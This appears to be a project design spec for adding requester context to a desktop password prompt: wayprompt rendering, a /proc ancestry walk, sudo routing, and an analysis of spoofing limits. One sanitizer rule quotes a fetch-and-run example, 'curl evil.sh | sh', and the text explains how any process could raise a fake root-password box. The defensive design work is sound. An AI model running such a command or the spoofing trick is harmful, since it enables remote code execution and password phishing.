# Giving the elevated-password prompt its context

**Date:** 2026-08-21
**Status:** approved, not yet implemented

## Why

Two complaints, one root cause.

**The box doesn't say who popped it.** `gatherd-askpass` renders a crimson
fuzzel entry tagged `[sudo]`, `[polkit]` or `[vault]` and nothing else. When a
root-password box appears unbidden, the only honest reaction is to guess. The
tag names the *mechanism*, never the *requester*.

**Terminal `sudo` is outside the family.** Typing at a `foot` prompt gets
sudo's tty prompt; everything else gets the crimson box. So "the crimson box is
what asks for my password" isn't quite true, which is exactly the ambiguity
that makes an unexpected box hard to judge.

The goal is **security first, curiosity as the daily dividend**: enough context
that an unexpected prompt reads as unexpected. See *Trust levels* for the
sharply limited sense in which that is achievable.

## What we are not reinventing

Both halves were researched before designing. The findings changed the design,
so they are recorded here.

### The renderer exists: wayprompt

fuzzel cannot render two lines — a `\n` in `--prompt-only` draws as a literal
glyph on one line (verified). Every dmenu-family pinentry binding
(`pinentry-dmenu`, `pinentry-rofi`, `pinentry-bemenu`) shares that constraint.
`pinentry-gtk` renders a multi-line `SETDESC` correctly (verified with a live
Assuan session) but is GTK2, emits a `GLib-GObject-CRITICAL` on startup, and
cannot express the house style. `pinentry-qt` does not run here at all —
missing `libKF6WindowSystem.so.6`. `pinentry-gnome3` needs gnome-keyring's
`gcr` prompter, which we do not run.

[wayprompt](https://git.sr.ht/~leon_plickat/wayprompt) fits every constraint:

| Constraint | How wayprompt meets it |
| --- | --- |
| Two lines | `--title` + multi-line `--description` + `--prompt` |
| House style | `[colours]` background/border/text/pin-\*/button-\*; `[general]` `border`, `corner-radius` |
| Font | fcft — the same library fuzzel and foot use, so `foot_font_size` transfers verbatim |
| Fingerprint prompt matches | same binary, `--button-ok/--button-not-ok/--button-cancel`, no masking |
| No fuzzel single-instance lock | layer-shell, no lock |
| Secret hygiene | `src/SecretBuffer.zig`; no shell variable, no temp file |
| TTY/SSH | not needed — see *Routing terminal sudo*; wayprompt's TUI fallback is a bonus we do not rely on |

Packaging: AUR `wayprompt` 0.1.2-2, updated 2025-11-10, not flagged out of
date, built with zig 0.13, six pinned source tarballs rather than live
submodules — which matters for offline repave, since they are cacheable.

**Risk, stated plainly:** upstream is quiet (last commit 2024-08-25, 91
commits, one author). The AUR packaging is the actively maintained part. It is
a small Zig program doing one thing, so bit-rot is survivable; if it ever stops
building, we are back to fuzzel plus foot.

### The context-gathering does not exist, and there is a reason

No packaged askpass helper enriches its prompt: not `ksshaskpass`,
`lxqt-openssh-askpass`, `x11-ssh-askpass`, or `seahorse`. That is not an
oversight — **both upstreams discard the information before the prompter sees
it**:

- **sudo hands its askpass helper nothing.** Verified empirically: the helper's
  environment contains no `SUDO_COMMAND`, no `SUDO_UID`, no `SUDO_USER` — just
  the invoking user's environment plus `SUDO_ASKPASS`. The prompt string is the
  entire interface.
- **polkit cannot pass the subject to an agent.**
  `PolkitAgentListener.initiate_authentication()` takes
  `(action_id, message, icon_name, cookie, identities)` — no subject. See
  cmd-polkit `src/polkit-auth-handler.service.c:320`. This is a polkit API
  limit, not a cmd-polkit one, and it means *no polkit agent anywhere* can name
  the requesting process.
- **`run0`** routes elevation through polkit precisely to get a trustworthy
  prompt, and the standing complaint is that it displays `run0` rather than the
  command you ran.

So the `/proc` walk below is a **workaround for an API gap**, not a
reinvention. It is the part of this design most likely to need revisiting,
which is why it lives in its own script.

## Architecture

Deciding what to say and drawing the box are separate jobs. Only the first is
irreducibly ours.

```
caller                       context layer                renderer
──────                       ─────────────                ────────
sudo (SUDO_ASKPASS,
      sudo.conf Path)  ─┐
ssh / git (SSH_ASKPASS) ─┤
gatherd-prompt-vault    ─┼──▶  gatherd-askpass  ──────▶   wayprompt
gatherd-polkit-agent    ─┘      (classify, gather,         (AUR; house style
                                 sanitize, map exits)       from /etc/wayprompt)
                                        │
                                        └──▶ gatherd-prompt-context
                                             (/proc ancestry walk + allowlist)
```

`gatherd-askpass` **keeps its path and its contract** — `argv[1]` is the
prompt, stdout is the secret, non-zero exit is a cancel. So `/etc/sudo.conf`'s
`Path askpass`, both `pam_env` lines, `gatherd-prompt-vault` and
`gatherd-polkit-agent` are unchanged. Only its internals change: classify the
source from the prompt string (as it already does for `[sudo]` and `(yes/no`),
gather context, call `wayprompt` instead of `fuzzel`.

### Components

| Component | Job | Lives in |
| --- | --- | --- |
| `wayprompt` | draws the box | AUR → `roles/aur/tasks/main.yml` |
| `/etc/wayprompt/config.ini` | house style: crimson/salmon, `border=4`, `corner-radius=10`, fcft font from `foot_font_size` | new template, `roles/desktop` |
| `gatherd-prompt-context <pid>` | walk `/proc`, verify, allowlist, emit one line | `scripts/`, new |
| `gatherd-polkit-agent` | pass polkit's `message` and action id through as context instead of a bare `[polkit]` | `scripts/`, modified |
| `sudo` shell function | route interactive `sudo` to `-A` | `/etc/bash.bashrc` blockinfile, `roles/system` |

`gatherd-polkit-agent` needs the only contract change in the design: an
optional `argv[2]` on `gatherd-askpass` carrying a pre-computed context line,
used when the caller already knows more than a `/proc` walk could recover.
Backwards compatible — every existing caller passes one argument.

`/etc`, not `~/.config`: wayprompt checks `$XDG_CONFIG_HOME` first and
`/etc/wayprompt/config.ini` second. The styling derives from `foot_font_size`,
a machine fact rather than a user preference, and `/etc` means it applies
regardless of who runs the prompter.

### What gets deleted

- The `foot` host-key window (~50 lines of `--override` styling plus a
  `mktemp` answer file) becomes
  `wayprompt --description "<fingerprint>" --button-ok Yes --button-not-ok No
  --button-cancel Abort`: unmasked, room to read the key, and it matches the
  password box because it *is* the password box.
- The fuzzel invocation, its `</dev/null` workaround, and the
  single-instance-lock instrumentation in `askpass.log`. Layer-shell has no
  such lock.

## The context line

### Trust levels

**The two lines are not equally trustworthy, and the spec must not pretend
otherwise.**

- **Line 1 (sudo's argv) is fairly trustworthy.** The parent of the askpass
  helper *is* sudo — a setuid-root binary that does not rewrite its own argv.
  Hardened by requiring that `/proc/$PPID` be owned by uid 0 before its argv is
  shown as an elevation.

  An earlier draft proposed checking that `/proc/$PPID/exe` resolves to
  `/usr/bin/sudo`. **That check can never succeed**, measured from inside a real
  `sudo -A` askpass helper on this machine: because sudo is setuid-root the
  kernel clears its dumpable flag, `/proc/<sudo-pid>` becomes `root:user`, and
  `readlink` on `exe` returns empty even for the same real user. Had it shipped,
  the `elevating:` line would simply never have appeared. `cmdline` and `comm`
  stay readable throughout.

  Ownership is the better attestation anyway: the kernel sets it from the
  process's euid, so uid 0 proves the process actually gained privilege, and an
  unprivileged impostor cannot forge it. `comm` is spoofable via
  `prctl(PR_SET_NAME)`, so it only picks *which* privileged tool this is — it is
  never what establishes privilege. Measured: a real sudo parent is uid 0; the
  askpass helper and the shell above it are both uid 1000.
- **Line 2 (ancestor identity) is not.** `argv` lives in the process's own
  writable memory; rewriting it is precisely how `setproctitle` works. A
  malicious ancestor can name itself whatever it likes.

**The line is advisory, never an authorization control.** A `/proc` walk is
sampled rather than captured, so ancestry can churn underneath it; it is
self-reported; and nothing binds what we read to *this* authentication request.

**The spoofing risk we cannot fix:** any process can set `SUDO_ASKPASS` and
exec `gatherd-askpass "[sudo]"` directly, producing a convincing crimson
root-password box with no sudo involved. No `/proc` walk helps — it is inherent
to the askpass contract. The ownership check at least makes such a box show
"context unavailable" rather than a plausible fake command, since the impostor's
`/proc` entry is owned by the user rather than by root.

The honest ceiling is **recognize the unexpected, never authorize the
expected.**

### Per source

| Source | Context line | Origin |
| --- | --- | --- |
| `sudo` | `elevating: pacman -Syu` / `requested by claude in foot` | `/proc/$PPID/cmdline` (verified to be sudo), then the nearest non-shell ancestor |
| `polkit` | polkit's own sentence plus action id | already in cmd-polkit's JSON; currently discarded |
| `ssh` / `git` | the prompt string already names the key or URL | passed through, no walk |
| `vault` | fixed | literal |

### Rules

1. **Summarize, never dump.** A probed grandparent cmdline was a 900-character
   `bash -c` blob. Take sudo's argv (truncated with an ellipsis) plus the
   *name* of the nearest non-shell ancestor. Never a raw ancestor cmdline.
   "Non-shell ancestor" is exact: walking up from sudo, skip any process whose
   `comm` is `sudo`, `bash`, `sh`, `zsh`, `dash` or `fish`, and take the first
   process that is none of those — for the probed chain that yields `claude`.
   Report only its `comm`, never its cmdline. Stop at `sway`, `greetd` or pid 1
   and report the last thing seen, so a `sudo` typed at a bare shell says
   `requested by foot` rather than nothing.
2. **Allowlist-extract, do not blocklist-strip.** `LC_ALL=C tr -cd '\40-\176'`
   — keep printable ASCII, drop everything else. This deliberately *keeps*
   `;`, `|`, `&`: a reader needs to see `pacman -Syu; curl evil.sh | sh` as it
   really is. The danger was only ever control bytes and escape sequences.
   **If the allowlist removed anything, the line ends with a marker**, because
   silent dropping could make a command read as safer than it is. Cost: a
   non-ASCII path (`~/Café/x`) trips the marker. Accepted.
3. **Say so when there is nothing.** When context cannot be obtained, print
   `context unavailable` rather than nothing. The box is then always two lines,
   so the layout never shifts: absence is legible instead of looking normal,
   and a spoofed one-line box looks wrong on sight.

## Routing terminal sudo

A `sudo` shell function in an `/etc/bash.bashrc` blockinfile calling
`command sudo -A "$@"`. Scope is **interactive shells only**, as chosen.

`/etc/bash.bashrc` because the dotfiles repo symlinks only `gitconfig`,
`gitignore_global` and `tmux.conf` — no shell rc — and `/etc/profile.d` is
wrong for the same family of reasons the `pam_env` comment in
`roles/system/tasks/user_path.yml` documents: a `foot` window spawns a
*non-login* interactive bash, which reads `/etc/bash.bashrc` and never touches
`profile.d`. This is the first shell rc gatherd owns, so the block needs a
comment saying why.

**Guard on `WAYLAND_DISPLAY`**, so a TTY or an inbound SSH session gets sudo's
own tty prompt:

```sh
sudo() {
    if [ -n "$WAYLAND_DISPLAY" ]; then
        command sudo -A "$@"
    else
        command sudo "$@"
    fi
}
```

wayprompt does ship a TUI fallback for the no-Wayland case, and an earlier
draft leaned on it to drop this guard — calling it the biggest reason wayprompt
won, which was wrong on two counts.

First, it is not needed: **on a TTY the context is already on screen.** You
typed the command, and the prompt appears inline in the shell that ran it. The
context line exists for *unexpected* prompts; a tty prompt answering your own
keystroke is the most expected thing there is. The fallback would do its work
exactly where the feature has no value.

Second, relying on it would make the design depend on an unverified upstream
claim. The guard is one line, works today, and gives the better experience on a
tty anyway. wayprompt's real advantages are the multi-line description, the
full colour/border/radius config, fcft fonts, one binary for the fingerprint
prompt, layer-shell with no single-instance lock, and `SecretBuffer`.

`command sudo` still bypasses the function, and scripts are untouched since
they do not source `bash.bashrc`.

## Failure modes

**wayprompt missing.** It is an AUR package, so it exists only after REST.
CORE stays package-free as designed, and nothing in CORE prompts:
`gatherd-prompt-vault` gates on `core-complete`, and the pre-login vault prompt
goes through `systemd-ask-password` on the console. `gatherd-askpass` must
still define a behavior for its absence, and that behavior must **not** be
"fall back to fuzzel" — that resurrects the second look this design deletes.

**Decision: there is no fallback prompter. Log, and exit non-zero.**

A non-zero exit already means "cancel" to every caller, and each one does the
right thing with it:

- `gatherd-prompt-vault` is `... || exit 0` (line 16), so it leaves its loop
  cleanly. It does **not** spin — an earlier draft of this spec claimed it
  would, and that was wrong. The console prompt
  (`gatherd-prompt-vault-console`) remains the way in, which is what it is for;
  the in-session box is already the *fallback*, so a fallback-to-the-fallback
  is not owed.
- polkit gets a cancel, which is the correct default for an auth request that
  cannot be presented to a human.
- `sudo` and `ssh` abort, as they would on Escape.

**`systemd-ask-password` was considered and rejected.** It needs no packages
and is already proven here for the pre-login vault prompt, which made it
tempting. But `plans/2026-06-29-arch-bootstrap-migration.md:21` requires "no new
systemd coupling beyond what exists; keep runtime logic in POSIX scripts," and
line 163 names the early vault prompt as *the one* console-coupled piece, with
a planned `openvt` swap for Artix/s6. Putting `systemd-ask-password` into
`gatherd-askpass` would make that two pieces, in a script that runs in every
graphical session, and would owe the Artix port a second answer. Exiting
non-zero owes it nothing.

**This design is Artix/s6-clean as a whole.** wayprompt depends on zig,
wayland, fcft, pixman and xkbcommon — no systemd — and the no-Wayland case is
handled by the shell function's own guard rather than by anything init-specific.
Nothing here needs a second answer after the migration.

**Narrowing the window instead of papering over it:** install wayprompt from
`roles/aur/tasks/main.yml` rather than `slow.yml`. All of REST is post-login
anyway, so `slow.yml` buys nothing here, and a small zig build does not merit
it. The prompter gates every other credential interaction in the session, so it
belongs early in REST.

**Exit-code mapping**, from wayprompt(1): `0` ok, `10` cancel, `20` not-ok, `1`
error. `gatherd-askpass` maps `0` → print secret, exit 0; everything else →
exit non-zero, which sudo and ssh read as abort.

**Do not reuse the stock `wayprompt-ssh-askpass`.** It puts the whole prompt in
`--title` (large font, no description), and extracts the secret with
`sed -e 's/pin: //'`, which strips that string from anywhere in the line — a
password containing `pin: ` is corrupted — then `echo`es it. Ours parses line 2
with `sed -n '2s/^pin: //p'` and emits with `printf '%s\n'`.

## What a correct API would look like

Recorded so the next person does not re-derive it. The primitives already exist
on this machine (kernel 7.1.8):

- **`SO_PEERPIDFD`** (77, Linux 6.5+) — the kernel hands you a pidfd for a unix
  socket's peer. A pidfd is a stable handle to one specific process and can
  never silently refer to a recycled PID. Kills the sampling race.
- **`SO_PEERCRED` / `SO_PEERSEC`** — kernel-stamped uid/gid and LSM label, not
  self-reported.
- **`sd_bus_query_sender_creds()`** already assembles the whole picture for
  D-Bus — pid, pidfd, uid, exe, cgroup, unit, session, label — and carries
  **`SD_BUS_CREDS_AUGMENT`**, a per-field flag distinguishing kernel-attested
  values from ones merely read out of `/proc` afterwards. That
  attested-vs-augmented distinction is the concept the askpass world lacks.
- **polkit's `PolkitUnixProcess`** already carries pid plus start time, the
  classic PID-reuse defense. polkit *has* the subject; it drops it at the last
  hop.

Three changes would close the gap:

1. **polkit: pass the subject to the agent.** Add the `PolkitSubject` — ideally
   a pidfd plus attested creds — to `initiate_authentication()` alongside
   `action_id`/`message`/`cookie`. One signature change makes the polkit half
   trustworthy instead of heuristic.
2. **sudo: replace "exec a helper, read stdout" with a socket.** The helper
   could then `SO_PEERPIDFD` sudo itself for kernel-attested identity, and sudo
   could send the command *as sudo parsed it* — authoritative, since sudo is
   the thing enforcing policy on that argv. Today sudo knows the answer
   perfectly and passes along nothing.
3. **Generally, a credential-prompt request object**: a cookie binding it to
   one transaction, kernel-attested requester identity (pidfd, uid, exe as an
   fd or fs-verity digest, cgroup/unit, LSM label), the policy-relevant action
   as the *enforcer* parsed it, and a per-field attested-vs-augmented flag.

**No API removes the ceiling.** Even a perfect one names the requesting
*process*, never whether the *human* intended it — that is `run0`'s complaint,
where the trusted enforcer sat one level below where the meaning lived. And a
compromised process asking legitimately is indistinguishable from a legitimate
one.

## Out of scope

**git's username prompt.** `askpass.log` shows
`Username for 'https://github.com':` reaching the prompter on 2026-08-05 and
being masked as a password. wayprompt has only `--get-pin` (masked
pin-squares) and no unmasked text entry, so this does not improve and arguably
worsens — a username typed into a row of squares is invisible. Pre-existing,
not a regression. Recorded in `plans/TODO.md`.

## Verification

Per `CLAUDE.md`, a step is added to `section_verify` in
`scripts/gatherd-post-setup-notes` as a runnable command sequence. It must
cover: the box shows two lines for a terminal `sudo`; `context unavailable`
appears when `gatherd-askpass` is exec'd directly; the fingerprint prompt
renders unmasked with three buttons; and `sudo` with `WAYLAND_DISPLAY` unset
falls through to sudo's own tty prompt rather than failing.
